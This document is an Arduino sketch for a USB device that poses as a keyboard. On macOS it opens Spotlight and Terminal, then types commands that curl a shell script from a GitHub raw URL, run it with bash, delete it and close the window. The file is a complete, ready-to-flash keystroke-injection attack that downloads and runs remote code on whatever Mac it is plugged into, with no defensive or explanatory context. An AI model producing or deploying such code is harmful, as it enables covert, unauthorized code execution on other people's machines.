#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}

void p(char *line) {
  DigiKeyboard.print(line);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  p("terminal");
  p("curl -o ~/h.sh https://raw.githubusercontent.com/rmilne/hoffer/master/hoff_osx.sh");
  DigiKeyboard.delay(500);
  p("bash ~/h.sh ; rm ~/h.sh ; exit");
  for(;;){ 
    digitalWrite(1, HIGH);
    delay(200);
    digitalWrite(1, LOW);
    delay(100);
  }
}
